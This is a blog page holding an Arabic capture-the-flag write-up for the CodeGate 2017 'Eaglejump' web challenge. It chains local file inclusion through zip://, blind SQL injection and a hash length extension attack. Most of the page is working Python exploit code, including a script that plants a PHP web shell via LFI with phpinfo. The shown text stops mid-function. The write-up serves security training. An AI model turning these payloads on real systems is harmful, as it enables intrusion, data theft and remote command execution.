<!DOCTYPE html>
<html lang="en" data-theme="light"><head>
    <title> MtucX | Eaglejump </title>
    <meta charset="utf-8"><meta name="generator" content="Hugo 0.70.0" /><meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
    <meta name="description" content="pwn - web - rev">
    
    <link rel="stylesheet" href="https://example.com/css/style.min.67cd718c0a3c8009c771494d381fb7128246a454bd0518fed97cb65d257db948.css" integrity="sha256-Z81xjAo8gAnHcUlNOB&#43;3EoJGpFS9BRj&#43;2Xy2XSV9uUg=" crossorigin="anonymous" type="text/css">
    
    <link href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet" integrity="sha384-wvfXpqpZZVQGK6TAh5PVlGOfQNHSoD2xbE+QkPxCAFlNEevoEH3Sl0sibVcOQVnN" crossorigin="anonymous">
    
    <link rel="shortcut icon" href="https://example.com/favicons/favicon.ico" type="image/x-icon">
    <link rel="apple-touch-icon" sizes="180x180" href="https://example.com/favicons/apple-touch-icon.png">
    <link rel="icon" type="image/png" sizes="32x32" href="https://example.com/favicons/favicon-32x32.png">
    <link rel="icon" type="image/png" sizes="16x16" href="https://example.com/favicons/favicon-16x16.png">
    <link rel="canonical" href="https://example.com/post/eaglejump/">
    
    
    <script type="text/javascript" src="https://example.com/js/anatole-header.min.c275265a259296f3dd50e8236a77fcbcadb1dbb9597d3045c675dcc2c7c58a93.js" integrity="sha256-wnUmWiWSlvPdUOgjanf8vK2x27lZfTBFxnXcwsfFipM=" crossorigin="anonymous"></script>
    <meta name="twitter:card" content="summary_large_image"/>
<meta name="twitter:image" content="https://example.com/images/site-feature-image.png"/>

<meta name="twitter:title" content="Eaglejump"/>
<meta name="twitter:description" content="اولا لم اكتب با للغة العربية اكثر من 7 سنوات سوف تجدون الكثير من الاخطاء ملاحظة هذا حل للتحدي وليس شرح لكن سوف اقوم بوضع روابط اطلعو عليها كما انني قمت بحل التحدي منذ مدة طويلة"/>

</head><body><div class="sidebar animated fadeInDown">
    <div class="logo-title">
      <div class="title">
        <img src="https://example.com/images/mtucx.jpg" alt="profile picture">
        <h3 title=""><a href="/">MtucX</a></h3>
        <div class="description">
          <p>pwn - web - rev</p>
        </div>
      </div>
    </div>
    <ul class="social-links">
        
        <li>
        <a href="https://de.linkedin.com/" rel="me" aria-label="Linkedin">
          <i class="fa fa-2x fa-linkedin" aria-hidden="true"></i>
        </a>          
        </li>

        
        <li>
        <a href="https://github.com/h4dla3" rel="me" aria-label="GitHub">
          <i class="fa fa-2x fa-github" aria-hidden="true"></i>
        </a>          
        </li>

        
        <li>
        <a href="https://www.instagram.com/" rel="me" aria-label="instagram">
          <i class="fa fa-2x fa-instagram" aria-hidden="true"></i>
        </a>          
        </li>

        
    </ul>
    <div class="footer">
        <div class="by_farbox">&copy; MtucX 2020 </div>
      </div>
    </div>
</div><div class="main">
            <div class="page-top animated fadeInDown">
    <ul class="nav">
        
        
        
        <li><a  href="/" title="">Home</a></li>
        
        
        <li><a  href="/post/" title="">Posts</a></li>
        
        
        <li><a  href="/about/" title="">About</a></li>
        
    </ul>
    <div class="themeswitcher">
        <a class="theme-switch" title="Switch Theme">
            <i class="fa fa-adjust fa-fw" aria-hidden="true"></i>
        </a>
    </div>
</div>

            <div class="autopagerize_page_element">
                <div class="content">
<div class="post animated fadeInDown">
    <div class="post-content">

      <div class="post-title">
        <h3>Eaglejump
        </h3>
        
        <div class="info">
          <i class="fa fa-sun-o"></i><span class="date">Mon, Jan 1, 0001</span>
          <i class="fa fa-clock-o"></i><span class="reading-time">5-minute read</span>
        </div>
        
        </div>

    <!-- raw HTML omitted -->
<p>اولا لم اكتب با للغة العربية اكثر من 7 سنوات سوف تجدون الكثير من الاخطاء
ملاحظة هذا حل للتحدي وليس شرح لكن سوف اقوم بوضع روابط اطلعو عليها كما انني قمت بحل التحدي منذ مدة طويلة</p>
<p>المهم معنا حل تحدي eaglejump</p>
<p>فلنرى التحدي</p>
<p><img src="/images/2020-06-07_0555.png" alt="Images"></p>
<p>التحدي يقول</p>
<p>صنعت السيدة نيني المدونة الخاصة بشركتها ، إيجل-جامب. مهمتك هي العثور على نقاط الضعف المحتملة واستغلالها لتسريب الوثائق السرية.</p>
<p>تم إصدار هذا التحدي لأول مرة في نهائيات CodeGate 2017 CTF. شكرا للمؤلف لتقاسم التحدي
يمكنك ان تجد التحدي هنا</p>
<p><a href="http://chall.stypr.com/">http://chall.stypr.com/</a></p>
<p>نبدا التحدي</p>
<p><a href="http://chall.stypr.com/">http://chall.stypr.com/</a></p>
<p>نبدا التحدي</p>
<p><img src="/images/2020-06-07_094441.png" alt="Images"></p>
<p>بعد اللعب قليلا مع التحدي وجدت المعلومات لتسجيل الدخول هنا</p>
<p>view-source:https://eagle-jump.eagle-jump.org/?p=login</p>
<pre><code>&lt;!-- HERE IS GUEST ACCOUNT

ID : guest
PW : guest

HAPPY HACKING!
--&gt;
</code></pre><p>بعد اللعب مع الموقع وجدت ان هناك نسخة احتياطية للتحدي نقوم بتحميلها</p>
<p><img src="/images/2020-06-07_094416.png" alt="Images"></p>
<p>بعد تحميلها
والاطلاع على السورس
كان هناك</p>
<p>LFI + SQL INJECTION + HASH LENGTH EXTENSION ATTACKS</p>
<p><a href="https://en.wikipedia.org/wiki/File_inclusion_vulnerability">https://en.wikipedia.org/wiki/File_inclusion_vulnerability</a></p>
<p><a href="https://en.wikipedia.org/wiki/SQL_injection">https://en.wikipedia.org/wiki/SQL_injection</a></p>
<p><a href="https://en.wikipedia.org/wiki/Length_extension_attack#:~:text=In%20cryptography%20and%20computer%20security,the%20content%20of%20message1">https://en.wikipedia.org/wiki/Length_extension_attack#:~:text=In%20cryptography%20and%20computer%20security,the%20content%20of%20message1</a>.</p>
<p><a href="https://www.whitehatsec.com/blog/hash-length-extension-attacks/">https://www.whitehatsec.com/blog/hash-length-extension-attacks/</a></p>
<p><img src="/images/2020-06-07_075319.png" alt="Images"></p>
<p><img src="/images/2020-06-07_075413.png" alt="Images"></p>
<p>كما انه هناك الكثير من الفلترة
لكن ما لفت انتباهي هو
انه لا توجد فلترة على</p>
<p>zip
ولا
rpad reverse &hellip;. etc</p>
<p><img src="/images/2020-06-07_075841.png" alt="Images"></p>
<p>اذا سوف نقوم بشيء مثل</p>
<p>zip://back&hellip;.#</p>
<p>ايضا لفت انتباهي انه يجب ان يكون لدينا ال key</p>
<p><img src="/images/2020-06-07_075220.png" alt="Images"></p>
<p>اذا سوف يكون الاستغلال هكذا</p>
<p>?KEY=md5( key )&amp;p = zip://back..%23info.php</p>
<p>اذا اولا يجب ان نجلب</p>
<p>key</p>
<p>اولا hash length extension attack</p>
<p>يمكنك ان تقرا من الروابط التي فوق</p>
<p><img src="/images/2020-06-07_081349.png" alt="Images"></p>
<p>signature = integrity</p>
<p>عملت سكربت بسيط</p>
<p><img src="/images/2020-06-07_082104.png" alt="Images"></p>
<!-- raw HTML omitted -->
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> hashpumpy <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
<span style="color:#f92672">from</span> urllib <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
ayy <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;/*ID:aaaaaaaa*/SELECT * FROM board where no=&#34;</span>
data <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;/*&#39;</span>
add <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;*/+1#&#39;</span>
length <span style="color:#f92672">=</span> len(ayy)
signature, data <span style="color:#f92672">=</span> hashpump(<span style="color:#e6db74">&#39;4842689ee6a2f4c57c03fdf42cba18eccb56cd2c&#39;</span>,data,add,length)
<span style="color:#66d9ef">print</span> signature
<span style="color:#66d9ef">print</span> quote(data)
</code></pre></div><!-- raw HTML omitted -->
<p>الان</p>
<p><img src="/images/2020-06-07_081904.png" alt="Images"></p>
<p>اذا كنت مخطا في شيء سوف ترى مكان</p>
<p>welcome to eagle-jump</p>
<p>attack detected</p>
<p>الان عملت سكربت على السريع</p>
<p>لاستخراج</p>
<p>tables w columns</p>
<p>اولا استخرت table name</p>
<p>*/!!(SELECT (ord(reverse(rpad(table_name,%d,0x3f))))&amp;%d FROM information_schema.tables where table_type='base table&rsquo; and table_name!='users&rsquo;  and table_name!='board&rsquo;)</p>
<p><img src="/images/2020-06-07_080048.png" alt="Images"></p>
<!-- raw HTML omitted -->
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#!/usr/bin/python2</span>
<span style="color:#f92672">from</span> hashpumpy <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
<span style="color:#75715e"># python2 -m pip install hashpumpy</span>
<span style="color:#f92672">from</span> urllib <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
<span style="color:#f92672">import</span> urllib
<span style="color:#f92672">import</span> requests

ayy <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;/*ID:aaaaaaaa*/SELECT * FROM board where no=&#34;</span>
data <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;/*&#39;</span>
add <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;*/+1#&#39;</span>
leng <span style="color:#f92672">=</span> len(ayy)
xnxx <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;4842689ee6a2f4c57c03fdf42cba18eccb56cd2c&#39;</span>
<span style="color:#75715e"># PHPSESSID=; integrity=</span>

sess <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>Session()
sess<span style="color:#f92672">.</span>cookies[<span style="color:#e6db74">&#39;PHPSESSID&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;5i5ln92vf0t9o6nmbeh9u6l0h4&#39;</span>

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">trial</span>(i,j):
	add <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;*/!!(SELECT (ord(reverse(rpad(table_name,</span><span style="color:#e6db74">%d</span><span style="color:#e6db74">,0x3f))))&amp;</span><span style="color:#e6db74">%d</span><span style="color:#e6db74"> FROM information_schema.tables where table_type=0x62617365207461626c65 and table_name!=0x7573657273 and table_name!=0x626f617264)&#39;</span> <span style="color:#f92672">%</span> (j <span style="color:#f92672">+</span><span style="color:#ae81ff">1</span> , <span style="color:#ae81ff">1</span> <span style="color:#f92672">&lt;&lt;</span> i)
    <span style="color:#75715e"># base table == 0x62617365207461626c65</span>
    <span style="color:#75715e"># users == 0x7573657273</span>
    <span style="color:#75715e"># board == 0x626f617264</span>
	sig, data_ <span style="color:#f92672">=</span> hashpump(xnxx, data, add, leng)
	url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;https://eagle-jump.eagle-jump.org/?&#39;</span> <span style="color:#f92672">+</span> urllib<span style="color:#f92672">.</span>urlencode({<span style="color:#e6db74">&#39;p&#39;</span>:<span style="color:#e6db74">&#39;read.php&#39;</span>,<span style="color:#e6db74">&#39;no&#39;</span>: data_})
	sess<span style="color:#f92672">.</span>cookies[<span style="color:#e6db74">&#39;integrity&#39;</span>] <span style="color:#f92672">=</span> sig
	a <span style="color:#f92672">=</span> sess<span style="color:#f92672">.</span>get(url)
	<span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#39;Welcome &#39;</span> <span style="color:#f92672">not</span> <span style="color:#f92672">in</span> a<span style="color:#f92672">.</span>text[<span style="color:#ae81ff">1076</span>:]
<span style="color:#75715e">#1385</span>
name <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>
<span style="color:#66d9ef">for</span> j <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">50</span>):
	r <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
	<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">8</span>):
		z <span style="color:#f92672">=</span> trial(i,j)
		r <span style="color:#f92672">|=</span> (z <span style="color:#f92672">&lt;&lt;</span> i)
	name <span style="color:#f92672">=</span> name<span style="color:#f92672">+</span>chr(r)
	<span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#39;?&#39;</span> <span style="color:#f92672">in</span> name:
		<span style="color:#66d9ef">break</span>
	<span style="color:#66d9ef">else</span>:
		<span style="color:#66d9ef">print</span> name
<span style="color:#75715e">#flag{e398a8bb1a707096</span>
</code></pre></div><p><img src="/images/2020-06-07_090212.png" alt="Images"></p>
<!-- raw HTML omitted -->
<p>الان
لكي لا نطيل
الاستغلال الخير هكذا</p>
<!-- raw HTML omitted -->
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#!/usr/bin/python2</span>
<span style="color:#f92672">from</span> hashpumpy <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
<span style="color:#75715e"># python2 -m pip install hashpumpy</span>
<span style="color:#f92672">from</span> urllib <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
<span style="color:#f92672">import</span> urllib
<span style="color:#f92672">import</span> requests

ayy <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;/*ID:aaaaaaaa*/SELECT * FROM board where no=&#34;</span>
data <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;/*&#39;</span>
add <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;*/+1#&#39;</span>
leng <span style="color:#f92672">=</span> len(ayy)
xnxx <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;4842689ee6a2f4c57c03fdf42cba18eccb56cd2c&#39;</span>
<span style="color:#75715e"># PHPSESSID=; integrity=</span>

sess <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>Session()
sess<span style="color:#f92672">.</span>cookies[<span style="color:#e6db74">&#39;PHPSESSID&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;5i5ln92vf0t9o6nmbeh9u6l0h4&#39;</span>

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">trial</span>(i,j):
	add <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;*/!!(SELECT ord(reverse(rpad(F14G,</span><span style="color:#e6db74">%d</span><span style="color:#e6db74">,0x3f)))&amp;</span><span style="color:#e6db74">%d</span><span style="color:#e6db74"> FROM FlagPart1)&#34;</span> <span style="color:#f92672">%</span> (j <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span> <span style="color:#f92672">&lt;&lt;</span> i)

	sig, data_ <span style="color:#f92672">=</span> hashpump(xnxx, data, add, leng)
	url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;https://eagle-jump.eagle-jump.org/?&#39;</span> <span style="color:#f92672">+</span> urllib<span style="color:#f92672">.</span>urlencode({<span style="color:#e6db74">&#39;p&#39;</span>:<span style="color:#e6db74">&#39;read.php&#39;</span>,<span style="color:#e6db74">&#39;no&#39;</span>: data_})
	sess<span style="color:#f92672">.</span>cookies[<span style="color:#e6db74">&#39;integrity&#39;</span>] <span style="color:#f92672">=</span> sig
	a <span style="color:#f92672">=</span> sess<span style="color:#f92672">.</span>get(url)
	<span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#39;Welcome &#39;</span> <span style="color:#f92672">not</span> <span style="color:#f92672">in</span> a<span style="color:#f92672">.</span>text[<span style="color:#ae81ff">1076</span>:]
<span style="color:#75715e">#1385</span>
name <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>
<span style="color:#66d9ef">for</span> j <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">50</span>):
	r <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
	<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">8</span>):
		z <span style="color:#f92672">=</span> trial(i,j)
		r <span style="color:#f92672">|=</span> (z <span style="color:#f92672">&lt;&lt;</span> i)
	name <span style="color:#f92672">=</span> name<span style="color:#f92672">+</span>chr(r)
	<span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#39;?&#39;</span> <span style="color:#f92672">in</span> name:
		<span style="color:#66d9ef">break</span>
	<span style="color:#66d9ef">else</span>:
		<span style="color:#66d9ef">print</span> name
<span style="color:#75715e">#flag{e398a8bb1a707096</span>
</code></pre></div><p><img src="/images/2020-06-07_090416.png" alt="Images"></p>
<!-- raw HTML omitted -->
<p>هنا قمنا بالعثورعلى الجزء الاول من flag</p>
<p>الان ناتي للجزء الثاني</p>
<p>كما راينا في الاول
يجب علينا معرفة الكاي نجرب</p>
<p>KEY=md5(flag part 1 )</p>
<p><img src="/images/2020-06-07_091453.png" alt="Images"></p>
<p>نجرب هكذا</p>
<p><img src="/images/2020-06-07_091407.png" alt="Images">
تمام
الان ناتي للجزء الثاني</p>
<p>lfi with phpinfo assistance</p>
<p>للتدريب
<a href="https://github.com/kindredgroupsec/vulnhub/tree/2327813c9bb770d7e03b3ff84849a6bbd6e342c1/lfi">https://github.com/kindredgroupsec/vulnhub/tree/2327813c9bb770d7e03b3ff84849a6bbd6e342c1/lfi</a>
<a href="https://github.com/hxer/vulnapp/tree/master/lfi_phpinfo">https://github.com/hxer/vulnapp/tree/master/lfi_phpinfo</a></p>
<p>تجد معلومات هنا</p>
<p><a href="https://insomniasec.com/cdn-assets/LFI_With_PHPInfo_Assistance.pdf">https://insomniasec.com/cdn-assets/LFI_With_PHPInfo_Assistance.pdf</a></p>
<p>ناتي للاستغلال الان</p>
<p><img src="/images/2020-06-07_092104.png" alt="Images"></p>
<p>المهم عملت  تعديل على</p>
<p><a href="https://github.com/D35m0nd142/LFISuite/blob/master/lfisuite.py">https://github.com/D35m0nd142/LFISuite/blob/master/lfisuite.py</a></p>
<!-- raw HTML omitted -->
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#!/usr/bin/python</span>
<span style="color:#75715e"># Author: D35m0nd142</span>
<span style="color:#75715e"># i made some changes</span>
<span style="color:#f92672">import</span> socket
<span style="color:#f92672">import</span> requests
<span style="color:#f92672">import</span> os<span style="color:#f92672">,</span>sys<span style="color:#f92672">,</span>time
<span style="color:#f92672">import</span> re
<span style="color:#f92672">import</span> urllib3

gen_headers <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#39;User-Agent&#39;</span>:<span style="color:#e6db74">&#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36&#39;</span>,
              <span style="color:#e6db74">&#39;Accept-Language&#39;</span>:<span style="color:#e6db74">&#39;en-US;&#39;</span>,
              <span style="color:#e6db74">&#39;Accept-Encoding&#39;</span>: <span style="color:#e6db74">&#39;&#39;</span>,
              <span style="color:#e6db74">&#39;Accept&#39;</span>: <span style="color:#e6db74">&#39;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&#39;</span>,
              <span style="color:#e6db74">&#39;Connection&#39;</span>:<span style="color:#e6db74">&#39;close&#39;</span>}
<span style="color:#75715e">#######INIT</span>
<span style="color:#75715e">#/?KEY=1de81526d511622e0a3cde89de0d3814&amp;p=zip://BACK_20170314.zip%23info.php</span>
<span style="color:#75715e">###########</span>
sess <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>Session()

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">SubstrFind</span>(resp, toFind):
    <span style="color:#66d9ef">if</span>(len(toFind) <span style="color:#f92672">&gt;</span> len(resp)):
        <span style="color:#66d9ef">return</span> []

    found <span style="color:#f92672">=</span> False
    indexes <span style="color:#f92672">=</span> []

    <span style="color:#66d9ef">for</span> x <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">0</span>,(len(resp)<span style="color:#f92672">-</span>len(toFind))<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>):
        <span style="color:#66d9ef">if</span>(ord(resp[x]) <span style="color:#f92672">==</span> ord(toFind[<span style="color:#ae81ff">0</span>])):
            found <span style="color:#f92672">=</span> True
            <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">0</span>,len(toFind)):
                <span style="color:#66d9ef">if</span>(ord(resp[x<span style="color:#f92672">+</span>i]) <span style="color:#f92672">!=</span> ord(toFind[i])):
                    found <span style="color:#f92672">=</span> False
                    <span style="color:#66d9ef">break</span>
        <span style="color:#66d9ef">if</span>(found):
            indexes<span style="color:#f92672">.</span>append(x)
            found <span style="color:#f92672">=</span> False
            x <span style="color:#f92672">+=</span> len(toFind)

    <span style="color:#66d9ef">return</span> indexes
<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">phpinfo_ext</span>(content):
    indexes <span style="color:#f92672">=</span> SubstrFind(content, <span style="color:#e6db74">&#34;AbracadabrA&#34;</span>)
    found <span style="color:#f92672">=</span> len(indexes) <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span>
    got <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>

    <span style="color:#66d9ef">if</span>(found):
        start <span style="color:#f92672">=</span> indexes[<span style="color:#ae81ff">0</span>]<span style="color:#f92672">+</span><span style="color:#ae81ff">11</span>
        <span style="color:#66d9ef">for</span> x <span style="color:#f92672">in</span> range(start, len(content)):
            <span style="color:#66d9ef">if</span>(content[x] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;&lt;&#39;</span>):
                <span style="color:#66d9ef">break</span>
            got <span style="color:#f92672">+=</span> content[x]

    <span style="color:#66d9ef">return</span> got

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">phpinfo_request</span>():
    rcvbuf <span style="color:#f92672">=</span> <span style="color:#ae81ff">1024</span>
    bigz <span style="color:#f92672">=</span> <span style="color:#ae81ff">3000</span>
    junkheaders <span style="color:#f92672">=</span> <span style="color:#ae81ff">30</span>
    junkfiles <span style="color:#f92672">=</span> <span style="color:#ae81ff">5</span>
    junkfilename <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&gt;&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">1000000</span>
    z <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;Z&#34;</span> <span style="color:#f92672">*</span> bigz
    found <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
<span style="color:#75715e">#User-Agent: </span>
    phpinfo_headers <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#39;User-Agent&#39;</span>:<span style="color:#e6db74">&#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36&#39;</span>,
                  <span style="color:#e6db74">&#39;z&#39;</span>: z,
                  <span style="color:#e6db74">&#34;Host&#34;</span>: <span style="color:#e6db74">&#34;eagle-jump.eagle-jump.org&#34;</span>,
                  <span style="color:#e6db74">&#39;Connection&#39;</span>:<span style="color:#e6db74">&#39;close&#39;</span>}

    <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#34;Cookie&#34;</span> <span style="color:#f92672">in</span> gen_headers:
        phpinfo_headers[<span style="color:#e6db74">&#39;Cookie&#39;</span>] <span style="color:#f92672">=</span> gen_headers[<span style="color:#e6db74">&#39;Cookie&#39;</span>]

    loop <span style="color:#f92672">=</span> range(<span style="color:#ae81ff">0</span>,junkheaders)
    <span style="color:#66d9ef">for</span> count <span style="color:#f92672">in</span> loop:
        phpinfo_headers[<span style="color:#e6db74">&#34;z</span><span style="color:#e6db74">%s</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">%</span> count] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">%s</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">%</span>count
        
    phpinfo_headers[<span style="color:#e6db74">&#34;Content-Type&#34;</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;multipart/form-data; boundary=-------------------------acebdf13572468&#34;</span>
    
    cmd <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;file_put_contents(&#34;/tmp/mtucx__&#34;,</span><span style="color:#ae81ff">\&#39;</span><span style="color:#e6db74">&lt;?php system($_GET[&#34;cmd&#34;]);?&gt;</span><span style="color:#ae81ff">\&#39;</span><span style="color:#e6db74">); echo xnxx;&#39;</span>
    content <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;&#34;---------------------------acebdf13572468</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">Content-Disposition: form-data; name=&#34;tfile&#34;; filename=&#34;test.html&#34;</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">Content-Type: text/html</span><span style="color:#ae81ff">\r\n\r\n</span><span style="color:#e6db74"> AbracadabrA &lt;?php </span><span style="color:#e6db74">%s</span><span style="color:#e6db74"> ?&gt; AbracadabrA</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;&#34;&#34;</span> <span style="color:#f92672">%</span>(cmd)
    
    loop <span style="color:#f92672">=</span> range(<span style="color:#ae81ff">0</span>,junkfiles)
    <span style="color:#66d9ef">for</span> count <span style="color:#f92672">in</span> loop:
        content <span style="color:#f92672">=</span> content <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;&#34;&#34;---------------------------acebdf13572468</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">Content-Disposition: form-data; name=&#34;ffile</span><span style="color:#e6db74">%d</span><span style="color:#e6db74">&#34;; filename=&#34;</span><span style="color:#e6db74">%d%s</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">Content-Type: text/html</span><span style="color:#ae81ff">\r\n\r\n</span><span style="color:#e6db74">no</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;&#34;&#34;</span><span style="color:#f92672">%</span>(count,count,junkfilename)
        content <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;---------------------------acebdf13572468--</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span> 
    
    phpinfo_headers[<span style="color:#e6db74">&#39;Content-Length&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">%s</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">%</span>(len(content))
    got <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
    sc <span style="color:#f92672">=</span> urllib3<span style="color:#f92672">.</span>connection_from_url(<span style="color:#e6db74">&#39;https://eagle-jump.eagle-jump.org&#39;</span>)<span style="color:#f92672">.</span>_new_conn()
    sc<span style="color:#f92672">.</span>connect()
    sc <span style="color:#f92672">=</span> sc<span style="color:#f92672">.</span>sock

    payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;POST /?KEY=1de81526d511622e0a3cde89de0d3814&amp;p=zip://BACK_20170314.zip</span><span style="color:#e6db74">%23i</span><span style="color:#e6db74">nfo.php HTTP/1.1</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">+</span> \
            <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">.</span>join(<span style="color:#e6db74">&#39;</span><span style="color:#e6db74">%s</span><span style="color:#e6db74">: </span><span style="color:#e6db74">%s</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">%</span> (key , value) <span style="color:#66d9ef">for</span> key, value <span style="color:#f92672">in</span> phpinfo_headers<span style="color:#f92672">.</span>items()) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\r\n\r\n</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">+</span> content
    <span style="color:#75715e">#print payload</span>
    <span style="color:#75715e">#exit()</span>
    sc<span style="color:#f92672">.</span>sendall(payload)

    resp <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>
    <span style="color:#66d9ef">while</span> <span style="color:#e6db74">&#39;tmp_name&#39;</span> <span style="color:#f92672">not</span> <span style="color:#f92672">in</span> resp:
        x <span style="color:#f92672">=</span> sc<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">4096</span>)
        <span style="color:#75715e">#print x</span>
        <span style="color:#66d9ef">if</span> x <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;&#39;</span>:
            <span style="color:#66d9ef">break</span>
        resp <span style="color:#f92672">+=</span> x
    <span style="color:#75715e">#print resp</span>
    <span style="color:#75715e">#exit()</span>
    <span style="color:#66d9ef">if</span>(<span style="color:#e6db74">&#34;tmp_name&#34;</span> <span style="color:#f92672">in</span> resp):
        found <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>
        lines <span style="color:#f92672">=</span> resp<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>)
        <span style="color:#66d9ef">for</span> line <span style="color:#f92672">in</span> lines:
            <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#34;tmp_name]&#34;</span> <span style="color:#f92672">in</span> line:
                mystr <span style="color:#f92672">=</span> str(line)
                array <span style="color:#f92672">=</span> mystr<span style="color:#f92672">.</span>split()
                tmp_name <span style="color:#f92672">=</span> array[<span style="color:#ae81ff">2</span>]
                <span style="color:#66d9ef">print</span> tmp_name
                <span style="color:#66d9ef">break</span>

